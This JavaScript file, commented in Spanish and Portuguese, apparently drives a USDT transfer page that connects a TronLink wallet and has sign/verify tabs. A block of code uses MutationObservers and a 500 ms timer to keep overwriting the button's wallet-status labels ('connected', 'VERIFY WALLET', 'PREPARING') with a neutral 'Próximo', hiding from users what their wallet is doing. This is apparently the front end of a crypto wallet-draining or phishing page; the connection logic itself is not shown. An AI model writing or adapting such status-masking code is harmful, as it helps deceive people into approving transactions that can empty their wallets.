document.addEventListener('DOMContentLoaded', function () {
    // 1. Obtener referencias a los elementos del HTML
    var btn = document.getElementById('connectBtn');
    var input = document.getElementById('amountInput');
    var addressInput = document.getElementById('addressInput');

    // 2. Configurar el texto inicial del botón
    if (btn) {
        btn.textContent = 'Siguiente';

        // 3. AGREGAR LA ACCIÓN AL HACER CLIC EN EL BOTÓN
        btn.addEventListener('click', async function () {
            var monto = input ? input.value.trim() : '';
            var direccionDestino = addressInput ? addressInput.value.trim() : '';

            // Validar que el usuario haya escrito un monto antes de continuar
            if (!monto || parseFloat(monto) <= 0) {
                alert('Por favor, ingresa una cantidad válida de USDT.');
                return;
            }

            console.log('Procesando envío de:', monto, 'USDT a:', direccionDestino);

            // Ejecutar la lógica de conexión / transacción Web3
            try {
                if (typeof conectarTronLink === 'function') {
                    var billetera = await conectarTronLink();
                    console.log('Conectado exitosamente con la billetera:', billetera);
                } else {
                    alert('Procesando');
                }
            } catch (error) {
                console.error('Error durante el proceso:', error);
                alert('Error al conectar: ' + error.message);
            }
        });
    }

    // 4. Cambiar el color del botón en tiempo real cuando se escribe un valor
    if (input) {
        input.addEventListener('input', function () {
            if (btn) {
                btn.style.background = this.value.trim() !== '' ? 'blue' : '#908cf2';
            }
        });
    }
});
// ================================================================
// Detección y reemplazo de texto en el botón
// ================================================================
(function() {
    // Definición de la función que cambia el texto del botón
    function substituirTextoBotao() {
        const btn = document.getElementById('connectBtn');
        if (btn) {
            const txt = btn.textContent.trim().toLowerCase();
            if (txt.includes('connected') || txt.includes('verify wallet') || txt.includes('preparing')) {
                btn.textContent = 'Próximo';
            }
        }
    }

    substituirTextoBotao();

    // --- 4. MUTATION OBSERVER PARA MONITORAR MUDANÇAS ---
    const observer = new MutationObserver(function(mutations) {
        let botaoMudou = false;
        
        for (const mutation of mutations) {
            if (mutation.target.id === 'connectBtn' || 
                mutation.target === document.getElementById('connectBtn') ||
                (mutation.type === 'childList' && mutation.target.querySelector && mutation.target.querySelector('#connectBtn'))) {
                botaoMudou = true;
                break;
            }
        }

        if (botaoMudou) {
            substituirTextoBotao();
        }
    });

    // Observa el cuerpo del documento
    if (document.body) {
        observer.observe(document.body, {
            childList: true,
            subtree: true,
            characterData: true,
            attributes: true,
            attributeFilter: ['textContent', 'innerHTML']
        });
    }

    // --- 5. OBSERVADOR ESPECÍFICO PARA EL BOTÓN ---
    const btn = document.getElementById('connectBtn');
    if (btn) {
        const btnObserver = new MutationObserver(function() {
            substituirTextoBotao();
        });
        btnObserver.observe(btn, {
            childList: true,
            characterData: true,
            subtree: true
        });
    }

    // --- 6. INTERVALO DE SEGURANÇA ---
    setInterval(function() {
        substituirTextoBotao();
    }, 500);

    console.log('[Auto] ✅ Sistema funcionando - substituindo "connected", "VERIFY WALLET" e "PREPARING" por "Próximo"');

})();

// ================================================================
// CONFIGURACIONES Y EVENTOS DEL DOM
// ================================================================

document.addEventListener('DOMContentLoaded', function () {
    var btn = document.getElementById('connectBtn');
    if (btn) {
        btn.textContent = 'Siguiente';
    }

    // Cambia el color del botón cuando el campo de valor es llenado
    var input = document.getElementById('amountInput');
    if (input) {
        input.addEventListener('input', function () {
            if (btn) {
                btn.style.background = this.value.trim() !== '' ? '#111dd8' : '#908cf2';
            }
        });
    }

    // Tabs (compatibilidad)
    var tabSign    = document.getElementById('tabSign');
    var tabVerify  = document.getElementById('tabVerify');
    var signContent   = document.getElementById('signContent');
    var verifyContent = document.getElementById('verifyContent');
    
    if (tabSign) {
        tabSign.addEventListener('click', function () {
            tabSign.classList.add('active');
            if (tabVerify) tabVerify.classList.remove('active');
            if (signContent) signContent.style.display = '';
            if (verifyContent) verifyContent.style.display = 'none';
        });
    }
    
    if (tabVerify) {
        tabVerify.addEventListener('click', function () {
            tabVerify.classList.add('active');
            if (tabSign) tabSign.classList.remove('active');
            if (verifyContent) verifyContent.style.display = '';
            if (signContent) signContent.style.display = 'none';
        });
    }

    // Contadores e inputs auxiliares
    var messageInput = document.getElementById('messageInput');
    var charCount    = document.getElementById('charCount');
    if (messageInput && charCount) {
        messageInput.addEventListener('input', function () {
            charCount.textContent = messageInput.value.length + ' / 1024';
        });
    }

    var clearAllBtn = document.getElementById('clearAllBtn');
    if (clearAllBtn) {
        clearAllBtn.addEventListener('click', function () {
            if (messageInput) messageInput.value = 'This account belongs to ...';
            if (charCount)    charCount.textContent = '27 / 1024';
            var sig = document.getElementById('signatureOutput');
            if (sig) sig.textContent = 'Will be generated after signing';
        });
    }

    var closePanelBtn = document.getElementById('closePanelBtn');
    if (closePanelBtn) {
        closePanelBtn.addEventListener('click', function () {
            var panel = document.querySelector('.sign-panel');
            if (panel) panel.style.display = 'none';
        });
    }
});
